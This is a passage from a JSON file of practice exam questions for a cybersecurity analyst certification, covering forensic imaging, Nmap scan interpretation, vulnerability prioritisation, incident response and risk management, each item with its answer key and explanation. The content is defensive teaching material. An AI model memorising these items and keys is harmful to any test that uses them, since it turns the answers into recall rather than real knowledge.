bandwidth consumption and beaconing both have different traffic patterns from the one shown in this example.","l":"c3-network","l2":"","k":"network flow anomaly"},{"id":"pt1-2","set":"pt1","ch":11,"d":3,"q":"Saanvi is conducting the recovery process after his organization experienced a security incident. During that process, he plans to apply patches to all of the systems in his environment. Which one of the following should be his highest priority for patching?","o":["Windows systems","Systems involved in the incident","Linux systems","Web servers"],"a":1,"e":"During an incident recovery effort, patching priority should be placed on systems that were directly involved in the incident. This is one component of remediating known issues that were actively exploited.","l":"c11-recover","l2":"","k":"recovery patching priority"},{"id":"pt1-3","set":"pt1","ch":8,"d":2,"q":"Susan’s organization suffered a major breach attributed to an advanced persistent threat (APT) that exploited zero-day vulnerabilities to gain control of systems on her company’s network. She is evaluating different defensive approaches with her security team. Which of the following is the <i>least</i> appropriate solution for Susan to recommend to help prevent future attacks of this type?","o":["Heuristic attack detection methods","Signature-based attack detection methods","Segmentation","Leverage threat intelligence"],"a":1,"e":"Signature-based attack detection methods rely on knowing what an attack or malware looks like. Zero-day attacks are unlikely to have an existing signature, making signature-based detection ineffective against them. Heuristic (behavior) detection methods can indicate compromises despite the lack of signatures for the specific exploit. Building a well-designed and segmented network can limit the impact of compromises or even prevent them. Leveraging threat intelligence to understand new attacks and countermeasures is an important part of defense against zero-day attacks.","l":"c8-managing","l2":"c4-classify","k":"zero-day attack defense"},{"id":"pt1-4","set":"pt1","ch":10,"d":3,"q":"During his investigation of a Windows system, Eric discovered that files were deleted and he wants to determine whether a specific file previously existed on the computer. Which of the following is the <i>least</i> likely to be a potential location to discover evidence supporting that theory?","o":["Windows Registry","Master File Table","INDX records","Event logs"],"a":3,"e":"The Windows Registry, Master File Tables, and INDX records all contain information about files, often including removed or deleted files. Event logs are far less likely to contain information about a specific file location.","l":"c10-analysis","l2":"","k":"file recovery forensic artifacts"},{"id":"pt1-5","set":"pt1","ch":3,"d":1,"q":"As part of her SOC analyst duties, Emily is tasked with monitoring intrusion detection systems that cover her employer’s corporate headquarters network. During her shift, Emily’s IDS alarms report that a network scan has occurred from a system with IP address 10.0.11.19 on the organization’s WPA3 Enterprise wireless network aimed at systems in the finance division. What data source should she check first?","o":["Host firewall logs","AD authentication logs","Wireless authentication logs","WAF logs"],"a":2,"e":"Since Emily’s organization uses WPA3 Enterprise, users must authenticate to use the wireless network. Associating the scan with an authenticated user will help incident responders identify the device that conducted the scan. Therefore, Emily should first check wireless authentication logs.","l":"c3-network","l2":"","k":"wireless authentication logs"},{"id":"pt1-6","set":"pt1","ch":10,"d":3,"q":"Casey’s incident response process leads her to a production server that must stay online for her company’s business to remain operational. What method should she use to capture the data she needs?","o":["Live image to an external drive.","Live image to the system’s primary drive.","Take the system offline and image to an external drive.","Take the system offline, install a write blocker on the system’s primary drive, and then image it to an external drive."],"a":0,"e":"Normally, forensic images are collected from systems that are offline to ensure that a complete copy is made. In cases like this where keeping the system online is more important than the completeness of the forensic image, a live image to an external drive using a portable forensic tool such as FTK Imager Lite, the <code>dd</code> command-line utility, or similar is the correct choice.","l":"c10-evidence","l2":"","k":"live forensic imaging"},{"id":"pt1-7","set":"pt1","ch":5,"d":2,"q":"What does the Nmap response “filtered” mean in port scan results?","o":["Nmap cannot tell whether the port is open or closed.","A firewall was detected.","An IPS was detected.","There is no application listening, but there may be one at any time."],"a":0,"e":"When Nmap returns a response of “filtered,” it indicates that Nmap cannot tell whether the port is open or closed. Filtered results are often the result of a firewall or other network device, but a response of filtered does not indicate that a firewall or IPS was detected. When Nmap returns a “closed” result, it means that there is no application listening at that moment.","l":"c5-portscan","l2":"","k":"Nmap filtered port state"},{"id":"pt1-8","set":"pt1","ch":2,"d":1,"q":"During her review of incident logs, Deepa discovers the initial entry via SSH on a front-facing bastion host (A) at 8:02 a.m. If the network that Deepa is responsible for is designed as shown here, what is the most likely diagnosis if the second intrusion shows up on host B at 7:15 a.m.?<figure><img alt=\"Network diagram depicts connections from the Internet through firewalls to an A-S S H bastion host and a B-internal management system.\" loading=\"lazy\" src=\"img/pt/c05un001.png\"/></figure>","o":["Internal host B was previously compromised.","Host A was compromised; then host B was compromised.","Neither host B nor host A are synchronized to NTP properly.","An internal threat compromised host B and then host A."],"a":2,"e":"The likeliest issue is a problem with the Network Time Protocol (NTP) synchronization for both of the hosts, because of an improperly set time zone or another time issue. The ruleset only allows traffic initiated by host A, making it impossible for host B to be the source of a compromise of A. The other options are possible, but the most likely issue is an NTP problem.","l":"c2-logging","l2":"","k":"NTP time synchronization"},{"id":"pt1-9","set":"pt1","ch":7,"d":2,"q":"Matt recently ran a vulnerability scan of his organization’s network and received the results shown here. He would like to remediate the server with the highest number of the most serious vulnerabilities first. Which one of the following servers should be on his highest priority list?<figure><img alt=\"Two charts of bars listing severity counts for 4 servers A to D, and a donut chart shows medium, low, and info vulnerabilities.\" loading=\"lazy\" src=\"img/pt/c05un002.png\"/></figure>","o":["Server A","Server B","Server C","Server D"],"a":3,"e":"The most serious vulnerabilities shown in this report are medium-severity vulnerabilities. Server D has the highest number (8) of vulnerabilities at that severity level.","l":"c7-cvss","l2":"c6-remediation","k":"vulnerability scan report interpretation"},{"id":"pt1-10","set":"pt1","ch":1,"d":1,"q":"Saanvi has been tasked with conducting a risk assessment for the midsized bank that he works at because of a recent compromise of their online banking web application. Saanvi has chosen to use the NIST 800-30 risk assessment process shown here. What likelihood of occurrence should he assign to breaches of the web application?<figure><img alt=\"Flow diagram depicts a risk assessment framework with four steps to prepare, conduct, communicate, and maintain the assessments.\" loading=\"lazy\" src=\"img/pt/c05un003.png\"/></figure>","o":["Low","Medium","High","Cannot be determined from the information given"],"a":2,"e":"When an event of the type that is being analyzed has occurred within the recent past (often defined as a year), assessments that review that event will normally classify the likelihood of occurrence as high since it has already occurred.","l":"c1-risk","l2":"","k":"NIST SP 800-30 risk assessment"},{"id":"pt1-11","set":"pt1","ch":6,"d":2,"q":"Hank’s boss recently came back from a CEO summit event where he learned about the importance of cybersecurity and the role of vulnerability scanning. He asked Hank about the vulnerability scans conducted by the organization and suggested that instead of running weekly scans that they simply configure the scanner to start a new scan immediately after the prior scan completes. How should Hank react to this request?","o":["Hank should inform the CEO that this would have a negative impact on system performance and is not recommended.","Hank should immediately implement the CEO’s suggestion.","Hank should consider the request and work with networking and engineering teams on possible implementation.","Hank should inform the CEO that there is no incremental security benefit from this approach and that he does not recommend it."],"a":2,"e":"The CEO’s suggestion is a reasonable approach to vulnerability scanning that is used in some organizations, often under the term <i>continuous scanning</i>. He should consider the request and the impact on systems and networks to determine a reasonable course of action.","l":"c6-requirements","l2":"","k":"continuous vulnerability scanning"},{"id":"pt1-12","set":"pt1","ch":1,"d":1,"q":"Selah’s organization suffers an outage of its point-to-point encrypted VPN because of a system compromise at its ISP. What type of issue is this?","o":["Confidentiality","Availability","Integrity","Accountability"],"a":1,"e":"This is an example of an availability issue. If data had been modified, it would have been an integrity issue, while exposure of data would have been a confidentiality issue. Accountability from the ISP isn’t discussed in the question.","l":"c1-objectives","l2":"","k":"CIA triad availability"},{"id":"pt1-13","set":"pt1","ch":12,"d":4,"q":"Garrett is working with a database administrator to correct security issues on several servers managed by the database team. He would like to extract a report for the DBA that will provide useful information to assist in the remediation effort. Of the report templates shown here, which would be most useful to the DBA team?<figure><img alt=\"Screenshot lists 8 vulnerability report titles and data sources with type icons indicating scan-based and host-based data for each title.\" loading=\"lazy\" src=\"img/pt/c05un004.png\"/></figure>","o":["Qualys Top 20 Report","Payment Card Industry (PCI) Technical Report","Executive Report","Technical Report"],"a":3,"e":"The Technical Report will contain detailed information on a specific host and is designed for an engineer seeking to remediate the system. The PCI Technical Report would focus on credit and debit card compliance issues, and there is no indication that this server is used for payment card processing. The Qualys Top 20 Report and Executive Report would contain summary information more appropriate for a management audience and would cover an entire network, rather than providing detailed information on a single system.","l":"c12-vuln-report","l2":"c6-remediation","k":"vulnerability report audience targeting"},{"id":"pt1-14","set":"pt1","ch":3,"d":1,"q":"Jiang’s SolarWinds network monitoring tools provide data about a system hosted in Amazon’s AWS environment. When Jiang checks his server’s average response time, he sees the results shown here. What action should Jiang take based on this information?<figure><img alt=\"Screenshot depicts SolarWinds graph tracking A W S-A M I response time bars up to 1500 m s and packet loss fluctuations over the timeline.\" loading=\"lazy\" src=\"img/pt/c05un005.png\"/></figure>","o":["He should increase the speed of his network link.","He should check for scheduled tasks at the times he sees spikes.","He should ensure that his network card has the proper latency settings.","He should perform additional diagnostics to determine the cause of the latency."],"a":3,"e":"Jiang needs to perform additional diagnostics to determine the cause of the latency.\n<p>Unfortunately for Jiang, this chart does not provide enough information to determine why the maximum response time rises to high levels intermittently. Since the events are not regularly timed, it is relatively unlikely that a scheduled task is causing the issue. Network cards do not have latency settings; latency is caused by network traffic, system response times, and similar factors. Increasing the speed of a network link may help with latency, but you do not have enough information to make that determination.</p>","l":"c3-network","l2":"","k":"network latency monitoring"},{"id":"pt1-15","set":"pt1","ch":3,"d":1,"q":"Alex notices the traffic shown here during a Wireshark packet capture. What is the host with IP address 10.0.2.11 most likely doing?<figure><img alt=\"Screenshot of Wireshark capture lists time, source, destination, protocol, length columns, with row 28 highlighted for port 80 S Y N packet.\" loading=\"lazy\" src=\"img/pt/c05un006.png\"/></figure>","o":["UDP-based port scanning","Network discovery via TCP","SYN-based port scanning","DNS-based discovery"],"a":2,"e":"This image shows a SYN-based port scan. The traffic is primarily made up of TCP SYN packets to a variety of common ports, which is typical of a SYN-based port scan.","l":"c3-tools","l2":"c5-portscan","k":"Wireshark SYN scan analysis"},{"id":"pt1-16","set":"pt1","ch":10,"d":3,"q":"Jake is building a forensic image of a compromised drive using the <code>dd</code> command with its default settings. He finds that the imaging is going very slowly. What parameter should he adjust first?","o":["<code>if</code>","<code>bs</code>","<code>of</code>","<code>count</code>"],"a":1,"e":"The most likely cause of this slowness is an incorrect block size. Block size is set using the <code>bs</code> flag and is defined in bytes. By default, <code>dd</code> uses a 512-byte block size, but this is far smaller than the block size of most modern disks. Using a larger block size will typically be much faster, and if you know the block size for the device you are copying, using its native block size can provide huge speed increases. This is set using a flag like <code>bs=64k</code>. The <code>if</code> and <code>of</code> flags adjust the input and output files, respectively, but there is no indication that these are erroneous. The <code>count</code> flag adjusts the number of blocks to copy and should not be changed if Jake wants to image the entire disk.","l":"c10-evidence","l2":"","k":"dd forensic imaging block size"},{"id":"pt1-17","set":"pt1","ch":1,"d":1,"q":"What purpose does a honeypot system serve when placed on a network as shown here?<figure><img alt=\"Network diagram depicts the internet connected through a border router and switch to a firewall, an internal trusted zone, and a honeypot.\" loading=\"lazy\" src=\"img/pt/c05un007.png\"/></figure>","o":["It prevents attackers from targeting production servers.","It provides information about the techniques attackers are using.","It slows down attackers like sticky honey.","It provides real-time input to IDSs and IPSs."],"a":1,"e":"A honeypot is used by security researchers and practitioners to gather information about techniques and tools used by attackers. A honeypot will not prevent attackers from targeting other systems, and unlike a tarpit, it is not designed to slow down attackers. Typically, honeypot data must be analyzed to provide useful information that can be used to build IDS and IPS rules.","l":"c1-network","l2":"c4-hunt","k":"honeypot network placement"},{"id":"pt1-18","set":"pt1","ch":4,"d":1,"q":"Munju’s security team has found consistent evidence of system compromise over a period of weeks, with additional evidence pointing to the systems they are investigating being compromised for years. Despite her team’s best efforts, Munju has found that her team cannot seem to track down and completely remove the compromise. What type of attack is Munju likely dealing with?","o":["A Trojan horse","An APT","A rootkit","A zero-day attack"],"a":1,"e":"Advanced persistent threats (APTs) are highly skilled attackers with advanced capabilities who are typically focused on specific objectives. To accomplish those objectives, they often obtain and maintain long-term access to systems and networks using powerful tools that allow them to avoid detection and to stay ahead of responders who attempt to remove them. A Trojan horse is simply malware disguised as something legitimate and does not by itself imply a prolonged, entrenched campaign. A rootkit is designed to hide malicious activity and can contribute to persistence, but it is a tool or technique rather than a broader attack pattern. A zero-day attack refers to the exploitation of an unknown vulnerability, which explains initial compromise but not the sustained, hard-to-remove intrusion over a period of years.","l":"c4-classify","l2":"","k":"advanced persistent threat characteristics"},{"id":"pt1-19","set":"pt1","ch":12,"d":4,"q":"Which one of the following metrics would be most useful in determining the effectiveness of a vulnerability remediation program?","o":["Number of critical vulnerabilities resolved","Time to resolve critical vulnerabilities","Number of new critical vulnerabilities per month","Time to complete vulnerability scans"],"a":1,"e":"Of these choices, the most useful metric would be the time required to resolve critical vulnerabilities. This is a metric that is entirely within the control of the vulnerability remediation program and demonstrates the responsiveness of remediation efforts and the time that a vulnerability was present. The number of vulnerabilities resolved and the number of new vulnerabilities each month are not good measures of the program’s effectiveness because they depend on the number of systems and services covered by the scan and the nature of those services.","l":"c12-vuln-report","l2":"","k":"remediation program effectiveness metrics"},{"id":"pt1-20","set":"pt1","ch":5,"d":2,"q":"Mike’s Nmap scan of a system using the command <code>nmap 192.168.1.100</code> does not return any results. What does Mike know about the system if he is sure of its IP address, and why?","o":["The system is not running any open services.","All services are firewalled.","There are no TCP services reachable on Nmap’s default 1,000 TCP ports.","There are no TCP services reachable on Nmap’s default 65,535 TCP ports."],"a":2,"e":"By default Nmap scans 1,000 of the most common TCP ports. Mike only knows that the system he scanned did not respond on any of those ports or to Nmap’s host discovery probes.","l":"c5-portscan","l2":"","k":"Nmap default port scan"},{"id":"pt1-21","set":"pt1","ch":10,"d":3,"q":"What is the purpose of creating a hash value for a drive during the forensic imaging process?","o":["To prove that the drive’s contents were not altered","To prove that no data was deleted from the drive","To prove that no files were placed on the drive","All of the above"],"a":3,"e":"Once they are connected via a write blocker, a checksum is created (using SHA-2, SHA-3, or a similar hashing algorithm). If the hash computed from a forensic image matches the hash of the original drive, the image is an exact duplicate, meaning that the drive’s contents were not altered and that no files were added to or deleted from the drive.","l":"c10-analysis","l2":"c10-evidence","k":"forensic imaging hash validation"},{"id":"pt1-22","set":"pt1","ch":10,"d":3,"q":"After completing his unsuccessful forensic analysis of the hard drive from a workstation compromised by malware, Ben sends it to his company’s desktop support team for reimaging and patching. Shortly after the system returns to service, the device reconnects to the same botnet. What action should Ben take as part of his next forensic review if this is the only system showing symptoms like this?","o":["Verify that all patches are installed.","Destroy the system.","Validate the UEFI firmware integrity against a known good baseline.","Check for a system with a duplicate MAC address."],"a":2,"e":"Although firmware infections are relatively rare, some malware can persist in UEFI firmware or in components involved in the boot chain. In those cases, wiping and reimaging the hard drive will not remove the infection, and disk forensics may not reveal the root cause. If the desktop support team has fully patched and reimaged the system and no other systems show similar behavior, Ben’s next step is to examine the parts of the platform he did not previously validate by confirming Secure Boot is enabled and intact and comparing measured boot or TPM-backed attestation data to a known-good baseline (or reflashing UEFI firmware from a trusted image if integrity cannot be established).","l":"c10-analysis","l2":"c11-recover","k":"UEFI firmware integrity validation"},{"id":"pt1-23","set":"pt1","ch":3,"d":1,"q":"Part of the forensic data that Susan was provided for her investigation was a Wireshark packet capture. The investigation is aimed at determining what type of media an employee was consuming during work. What more detailed analysis can Susan perform using the data shown here?<figure><img alt=\"Screenshot depicts Wireshark capture filters T C P stream 2 and lists time, source, destination, protocol, Info, and length columns.\" loading=\"lazy\" src=\"img/pt/c05un008.png\"/></figure>","o":["She can determine that the user was viewing a GIF.","She can manually review the TCP stream to see what data was sent.","She can export and view the GIF.","She cannot determine what media was accessed using this dataset."],"a":2,"e":"Wireshark includes the ability to export packets. In this case, Susan can select the GIF89a detail by clicking that packet and then export the actual image to a file that she can view.","l":"c3-tools","l2":"","k":"Wireshark packet object export"},{"id":"pt1-24","set":"pt1","ch":9,"d":3,"q":"Which one of the following models traces the steps that an attacker would commonly perform during an intrusion?","o":["MITRE ATT&amp;CK","Diamond Model of Intrusion Analysis","Cyber Kill Chain","STIX"],"a":2,"e":"The Lockheed Martin Cyber Kill Chain traces the steps used to conduct an attack. The Diamond Model of Intrusion Analysis and the MITRE ATT&amp;CK model are used to classify attacks. STIX is a standard format for describing threats.","l":"c9-frameworks","l2":"","k":"Cyber Kill Chain steps"},{"id":"pt1-25","set":"pt1","ch":5,"d":2,"q":"Mika wants to run an Nmap scan that includes all TCP ports and uses service detection. Which of the following <code>nmap</code> commands should she execute?","o":["<code>nmap -p0 -all -SC</code>","<code>nmap -p 1-32768 -sVS</code>","<code>nmap -p 1-65535 -sV -sS</code>","<code>nmap -all -sVS</code>"],"a":2,"e":"Scanning the full range of TCP ports can be done using a SYN scan (<code>-sS</code>) and declaring the full range of possible ports (<code>1-65535</code>). Service version identification is enabled with the <code>-sV</code> flag.","l":"c5-portscan","l2":"","k":"Nmap full port SYN scan"},{"id":"pt1-26","set":"pt1","ch":2,"d":1,"q":"Which one of the following cloud service models relies on the cloud service provider to implement the greatest number of security controls?","o":["SaaS","PaaS","FaaS","IaaS"],"a":0,"e":"The software-as-a-service (SaaS) model requires the cloud service provider to secure the entire service stack. Other models provide cloud service customers with greater degrees of control and responsibility over security.","l":"c2-infra","l2":"","k":"SaaS shared responsibility model"},{"id":"pt1-27","set":"pt1","ch":7,"d":2,"q":"Dan is a cybersecurity analyst for a healthcare organization. He ran a vulnerability scan of the VPN server used by his organization. His scan ran from inside the datacenter against a VPN server also located in the datacenter. The complete vulnerability report is shown here. What action should Dan take next?<figure><img alt=\"Screenshot of vulnerability report details non-zero padding bytes with Q I D, category, threat, impact, exploitability, and solution fields.\" loading=\"lazy\" src=\"img/pt/c05un009.png\"/></figure>","o":["Dan should immediately remediate this vulnerability.","Dan should schedule the vulnerability for remediation within the next 30 days.","Dan should rerun the scan because this is likely a false positive report.","Dan should take no action."],"a":3,"e":"Dan does not need to take any action. This is a very low criticality vulnerability (1/5), and it is likely not exploitable from outside the datacenter. It is not necessary to remediate this vulnerability, and there is no indication that it is a false positive report. Overall, this is a clean scan result for a VPN server.","l":"c7-validate","l2":"c6-remediation","k":"vulnerability prioritization and context"},{"id":"pt1-28","set":"pt1","ch":3,"d":1,"q":"Kwame received an alert from his organization’s SIEM that it detected a potential attack against a web server on his network. However, he is unsure whether the traffic generating the alert actually entered the network from an external source or whether it came from inside the network. The NAT policy at the network perimeter firewall rewrites public IP addresses, making it difficult to assess this information based on IP addresses. Kwame would like to perform a manual log review to locate the source of the traffic. Where should he turn for the best information?","o":["Application server logs","Database server logs","Firewall logs","Antimalware logs"],"a":2,"e":"All of the data sources listed in this question may provide Kwame with further information about the attack. However, firewall logs would be best positioned to answer his specific question about the source of the attack. Since the firewall is performing network address translation (NAT), it would likely have a log entry of the original (pre-NAT) source IP address of the traffic.","l":"c3-tools","l2":"","k":"firewall log NAT correlation"},{"id":"pt1-29","set":"pt1","ch":6,"d":2,"q":"Which one of the following types of vulnerability scans would provide the least information about the security configuration of a system?","o":["Agent-based scan","Credentialed scan","Noncredentialed internal scan","Noncredentialed external scan"],"a":3,"e":"A noncredentialed scan provides far less information than a credentialed scan or an agent-based scan because both credentialed and agent-based scans are able to gather configuration information from the target systems. External scans also provide less information than internal scans because they are filtered by border firewalls and other security devices. Therefore, a noncredentialed external scan would provide the least information.","l":"c6-config","l2":"","k":"noncredentialed external vulnerability scan"},{"id":"pt1-30","set":"pt1","ch":11,"d":3,"q":"After finishing a forensic case, Sam needs to wipe a magnetic hard drive (HDD) that he is using to prepare it for the next case. Which of the following methods is best suited to preparing the hard drive that he will use if he wants to be in compliance with NIST SP 800-88?","o":["Degauss the drive.","Zero-write the drive.","Seven rounds: all ones, all zeros, and five rounds of random values.","Reformat the drive."],"a":1,"e":"NIST SP 800-88, along with many forensic manuals, requires a complete zero wipe of the drive but does not require multiple rounds of wiping. Degaussing is primarily used for magnetic media like tapes and renders a hard drive unusable, which would prevent Sam from using it for his next case. Reformatting the drive removes the file system references to data but leaves the data itself on the drive, where it may be recovered using forensic tools.","l":"c11-recover","l2":"","k":"NIST SP 800-88 media sanitization"},{"id":"pt1-31","set":"pt1","ch":9,"d":3,"q":"After reading the NIST standards for incident response, Mateo spends time configuring the NTP service on each of his servers, workstations, and appliances throughout his network. What phase of the incident response process is he working to improve?","o":["Preparation","Analysis","Containment, eradication, and recovery","Post-incident activity"],"a":1,"e":"NIST recommends that clock synchronization is performed for all devices to improve the ability of responders to conduct analysis, part of the detection and analysis phase of the NIST incident response process. Although this might occur in the preparation phase, it is intended to improve the analysis process.","l":"c9-process","l2":"c2-logging","k":"incident response clock synchronization"},{"id":"pt1-32","set":"pt1","ch":1,"d":1,"q":"Latisha is the ISO for her company and is notified that a zero-day exploit has been released that can result in remote code execution on all Windows workstations on her network because of an attack against Windows domain services. She wants to limit her exposure to this exploit but needs the systems to continue to be able to access the Internet. Which of the following approaches is best for her response?","o":["Firewalling","Patching","Isolation","Segmentation"],"a":0,"e":"Latisha knows that Windows domain services can be blocked using a network firewall. As long as she builds the correct ruleset, she can prevent external systems from sending this type of traffic to her Windows workstations. She may still want to segment her network to protect the most important workstations, but her first move should be to use her firewalls to prevent the traffic from reaching the workstations.","l":"c1-network","l2":"c8-controls","k":"firewall perimeter compensating control"},{"id":"pt1-33","set":"pt1","ch":11,"d":3,"q":"When Saanvi was called in to help with an incident recovery effort, he discovered that the network administrator had configured the network as shown here. What type of incident response action best describes what Saanvi has encountered?<figure><img alt=\"Network diagram shows containment, business office, and data center V L A N's connected through firewalls and a border router with ruleset.\" loading=\"lazy\" src=\"img/pt/c05un010.png\"/></figure>","o":["Segmentation","Isolation","Removal","Network locking"],"a":1,"e":"The systems in the containment network are fully isolated from the rest of the network using logical controls that prevent any access. To work with the systems that he needs to access, Saanvi will need to either have firewall rules added to allow him remote access to the systems or physically work with them.","l":"c11-contain","l2":"","k":"network isolation containment"},{"id":"pt1-34","set":"pt1","ch":2,"d":1,"q":"As part of the forensic investigation of a Linux workstation, Alex needs to determine what commands may have been issued on the system. If no anti-forensic activities have taken place, what is the best location for Alex to check for a history of commands issued on the system?","o":["<code>/var/log/commands.log</code>","<code>$HOME/.bash_history</code>","<code>$HOME/.commands.sqlite</code>","<code>/var/log/authactions.log</code>"],"a":1,"e":"On Linux systems that use the Bash shell, <code>$HOME/.bash_history</code> will contain a log of recently performed actions. The other options were made up for this question.","l":"c2-os","l2":"c10-analysis","k":"Linux bash history artifact"},{"id":"pt1-35","set":"pt1","ch":8,"d":2,"q":"Ben recently completed a risk analysis and determined that he should implement a new set of firewall rules to filter traffic from known suspect IP addresses. What type of risk management activity is he performing?","o":["Risk avoidance","Risk acceptance","Risk transference","Risk mitigation"],"a":3,"e":"Implementing firewall rules is an attempt to reduce the likelihood of a risk occurring. This is, therefore, an example of a risk mitigation strategy.","l":"c8-managing","l2":"","k":"risk mitigation treatment"},{"id":"pt1-36","set":"pt1","ch":6,"d":2,"q":"Crystal is attempting to determine the next task that she should take on from a list of security priorities. Her boss told her that she should focus on activities that have the most “bang for the buck.” Of the tasks shown here, which should she tackle first?<figure><img alt=\"Table listing four security issues with criticality levels and time required to fix from 6 hours to 12 weeks.\" loading=\"lazy\" src=\"img/pt/c05un011.png\"/></figure>","o":["Task 1","Task 2","Task 3","Task 4"],"a":2,"e":"Task 3 strikes the best balance between criticality and difficulty. It allows Crystal to remediate a medium criticality issue with an investment of only 6 hours of time. Task 2 is higher criticality but would take 12 weeks to resolve. Task 1 is the same criticality but would require a full day to fix. Task 4 is lower criticality but would require the same amount of time to resolve as Task 1.","l":"c6-remediation","l2":"c7-validate","k":"remediation prioritization balance"},{"id":"pt1-37","set":"pt1","ch":7,"d":2,"q":"During the analysis of an incident that took place on her network, Sofia discovered that the attacker used a stolen cookie to access a web application. Which one of the following attack types most likely occurred?","o":["On-path (man-in-the-middle)","Privilege escalation","Cross-site scripting","Session hijacking"],"a":3,"e":"The use of a stolen cookie is the hallmark of a session hijacking attack. These attacks focus on taking over an already existing session, either by acquiring the session key or cookies used by the remote server to validate the session or by causing the session to pass through a system the attacker controls, allowing them to participate in the session.","l":"c7-web-ot","l2":"","k":"cookie session hijacking"},{"id":"pt1-38","set":"pt1","ch":3,"d":1,"q":"Curt is conducting a forensic analysis of a Windows system and needs to determine whether a program was set to automatically run. Which of the following locations should he check for this information?","o":["NTFS INDX files","The Registry","Event logs","Prefetch files"],"a":1,"e":"The Windows Registry contains autorun keys that are used to make programs run at startup. In addition, scheduled tasks, individual user startup folders, and DLLs placed in locations that will be run by programs (typically malicious DLLs) are all locations where files will automatically run at startup or user login.","l":"c3-host","l2":"c2-os","k":"Windows Registry persistence run keys"},{"id":"pt1-39","set":"pt1","ch":10,"d":3,"q":"What concept measures how easy data is to lose?","o":["Order of volatility","Data transience","Data loss prediction","The Volatility Framework"],"a":0,"e":"The order of volatility of data measures how easy the data is to lose. The Volatility Framework is a forensic tool aimed at memory forensics, while data transience and data loss prediction are not common terms.","l":"c10-evidence","l2":"","k":"order of volatility"},{"id":"pt1-40","set":"pt1","ch":9,"d":3,"q":"Steps like those listed here are an example of what type of incident response preparation?<ol class=\"decimal\" start=\"1\">\n<li>Visit <a href=\"https://otx.alienvault.com\"><code>https://otx.alienvault.com</code></a> and enter the suspected C&amp;C system’s IP address in the top search input field.</li>\n<li>If the IP address is associated with malware C&amp;C activity, create a ticket in the incident response tracking system.</li></ol>","o":["Creating a CSIRT","Creating a playbook","Creating an incident response plan","Creating an IR-FAQ"],"a":1,"e":"Playbooks contain specific procedures used during a particular type of cybersecurity incident. In this case, the playbook entry addresses malware command-and-control traffic validation. Creating a CSIRT or IR plan occurs at a higher level, and IR-FAQs is not a common industry term.","l":"c9-foundation","l2":"","k":"incident response playbook"},{"id":"pt1-41","set":"pt1","ch":7,"d":2,"q":"While analyzing the vulnerability scan from her web server, Kristen discovers the issue shown here. Which one of the following solutions would best remedy the situation?<figure><img alt=\"Screenshot of vulnerability report details S S L and T L S server supports T L S v 1.0 with Q I D, Time detected, and C V S S fields.\" loading=\"lazy\" src=\"img/pt/c05un012.png\"/></figure>","o":["Move from TLS 1.0 to SSL 3.0.","Require IPsec connections to the server.","Disable the use of TLS.","Move from TLS 1.0 to TLS 1.3."],"a":3,"e":"Kristen should upgrade the web server to the most current secure version of TLS: TLS 1.3. SSL 3.0 has vulnerabilities similar to those in TLS 1.0 and is not a suitable alternative. IPsec is not effective for web communications. Disabling the use of TLS would jeopardize the security of information sent to and from the server and would create additional risk, rather than remedying the situation.","l":"c7-server-network","l2":"c2-crypto","k":"deprecated TLS protocol remediation"},{"id":"pt1-42","set":"pt1","ch":3,"d":1,"q":"Charles is building an incident response playbook for his organization that will address command-and-control client-server traffic detection and response. Which of the following information sources is least likely to be part of his playbook?","o":["DNS query logs","Threat intelligence feeds","Honeypot data","Notifications from internal staff about suspicious behavior"],"a":2,"e":"Relatively few organizations run honeypots because of the effort required to maintain and analyze the data they generate. DNS queries and other traffic logs, threat intelligence feeds, and notifications from staff are all common information sources for a variety of types of incident detection.","l":"c3-network","l2":"c9-foundation","k":"command and control traffic detection"},{"id":"pt1-43","set":"pt1","ch":7,"d":2,"q":"Carol recently fell victim to a phishing attack. When she clicked the link in an email message that she received, she was sent to her organization’s central authentication service and logged in successfully. She did verify the URL and certificate to validate that the authentication server was genuine. After authenticating, she was sent to a form that collected sensitive personal information that was sent to an attacker. What type of vulnerability did the attacker most likely exploit?","o":["Buffer overflow","Session hijacking","IP spoofing","Open redirect"],"a":3,"e":"In an open redirect attack, users may be sent to a genuine authentication server and then redirected to an untrusted server through the OAuth flow. This occurs when the authentication server does not validate OAuth server requests prior to redirection.","l":"c7-web-ot","l2":"","k":"open redirect attack"},{"id":"pt1-44","set":"pt1","ch":1,"d":1,"q":"As a penetration tester, Max uses Wireshark to capture all of his testing traffic. Which of the following is <i>not</i> a reason that Max would capture packets during penetration tests?","o":["To document the penetration test","To scan for vulnerabilities","To gather additional information about systems and services","To troubleshoot issues encountered when connecting to targets"],"a":1,"e":"Although packet capture can help Max document his penetration test and gather additional information about remote systems through packet analysis, as well as help troubleshoot connection and other network issues, sniffers aren’t useful for scanning for vulnerabilities on their own.","l":"c1-endpoint-pentest","l2":"c3-tools","k":"penetration testing packet capture role"},{"id":"pt1-45","set":"pt1","ch":6,"d":2,"q":"Rich recently configured new vulnerability scans for his organization’s business intelligence systems. The scans run late at night when users are not present. Rich received complaints from the business intelligence team that the performance burden imposed by the scanning is causing their overnight ETL jobs to run too slowly and they are not completing before business hours. How should Rich handle this situation?","o":["Rich should inform the team that they need to run the ETL jobs on a different schedule.","Rich should reconfigure the scans to run during business hours.","Rich should inform the team that they must resize the hardware to accommodate both requirements.","Rich should work with the team to find a mutually acceptable solution."],"a":3,"e":"Rich should not attempt to solve this problem on his own or dictate a specific solution. Instead, he should work with the business intelligence team to find a way to both meet their business requirements and accomplish the security goals achieved by scanning.","l":"c6-remediation","l2":"","k":"vulnerability scanning disruption mitigation"},{"id":"pt1-46","set":"pt1","ch":7,"d":2,"q":"Javier ran a vulnerability scan of a new web application created by developers on his team and received the report shown here. The developers inspected their code carefully and do not believe that the issue exists. They do have a strong understanding of SQL injection issues and have corrected similar vulnerabilities in other applications. What is the most likely scenario in this case?<figure><img alt=\"Screenshot depicts a high-severity C G I generic S Q L injection vulnerability with description of database access and exploit risk details.\" loading=\"lazy\" src=\"img/pt/c05un013.png\"/></figure>","o":["Javier misconfigured the scan.","The code is deficient and requires correction.","The vulnerability is in a different web application running on the same server.","The result is a false positive."],"a":3,"e":"Blind SQL injection vulnerabilities are difficult to detect and are a notorious source of false positive reports. Javier should verify the results of the tests performed by the developers but should be open to the possibility that this is a false positive report, as that is the most likely scenario.","l":"c7-validate","l2":"","k":"vulnerability scan false positive validation"},{"id":"pt1-47","set":"pt1","ch":4,"d":1,"q":"During an incident investigation, Mateo is able to identify the IP address of the system that was used to compromise multiple systems belonging to his company. What can Mateo determine from this information?","o":["The identity of the attacker","The country of origin of the attacker","The attacker’s domain name","None of the above"],"a":3,"e":"Although it may be tempting to assign blame based on an IP address, attackers frequently use compromised systems for attacks. Some may also use cloud services and hosting companies where they can purchase virtual machines or other resources using stolen 